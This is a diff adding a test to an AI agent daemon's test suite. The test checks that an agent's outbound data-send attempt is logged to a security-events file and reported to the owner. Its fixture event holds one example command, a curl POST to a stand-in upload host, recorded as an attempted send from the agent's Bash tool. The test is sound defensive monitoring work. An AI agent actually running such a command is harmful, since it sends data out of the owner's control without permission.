@@ -18,6 +18,7 @@ import {
   type DaemonLogger,
 } from '../../src/cli/commands/daemon.js';
 import type { W1Config } from '../../src/runtime/config.js';
+import type { OutboundAttemptEvent } from '../../src/api/security-events.js';
 import { createOwnerRuntime } from '../../src/runtime/owner-runtime.js';
 import { actionMcpSession } from '../helpers/action-mcp-session.js';
 import {
@@ -443,6 +444,56 @@ describe('daemon bootstrap', () => {
 
     expect(logs.filter((line) => line === 'info:owner policy: loaded')).toHaveLength(1);
     expect(policyContent).toBe('owner policy fixture\n');
+    await daemon.stop();
+  });
+
+  it('sends an outbound attempt from the owner runtime to the security log and the owner', async () => {
+    const root = mkdtempSync(join(tmpdir(), 'mama-daemon-outbound-'));
+    roots.push(root);
+    const mamaRoot = join(root, 'mama');
+    mkdirSync(mamaRoot, { recursive: true });
+    const gateway: DaemonGateway = {
+      start: vi.fn(async () => {}),
+      stop: vi.fn(async () => {}),
+      deliverResponse: vi.fn(async () => {}),
+      sendToOwner: vi.fn(async () => {}),
+      sendFile: vi.fn(async () => ({ sentAs: 'document' as const, size: 0 })),
+    };
+    let report: ((event: OutboundAttemptEvent) => void) | undefined;
+    const daemon = await bootDaemon({
+      home: root,
+      configPath: join(mamaRoot, 'config.yaml'),
+      config: config(mamaRoot),
+      logger: { info: () => {}, error: () => {} },
+      dependencies: {
+        createOwnerRuntime: vi.fn(async (options) => {
+          report = options.outboundAttempts;
+          return ownerDouble([]) as never;
+        }),
+        createViewerServer: vi.fn(() => viewerDouble([]) as never),
+        startConnectorRuntime: vi.fn(async () => ({ stop: vi.fn(async () => {}) }) as never),
+        createTelegramGateway: vi.fn(() => gateway),
+      },
+    });
+
+    report?.({
+      time: new Date().toISOString(),
+      class: 'outbound_send',
+      tool: 'Bash',
+      summary: 'curl -X POST -d x https://upload.example/',
+      sendsData: true,
+      modelRunId: 'mr_daemon',
+      callId: 'call-daemon',
+    });
+    await vi.waitFor(() =>
+      expect(gateway.sendToOwner).toHaveBeenCalledWith(
+        expect.stringContaining('Agent outbound attempt'),
+        expect.stringMatching(/^agent-outbound:/)
+      )
+    );
+    expect(readFileSync(join(mamaRoot, 'logs', 'security-events.jsonl'), 'utf8')).toContain(
+      'mr_daemon'
+    );
     await daemon.stop();
   });
 
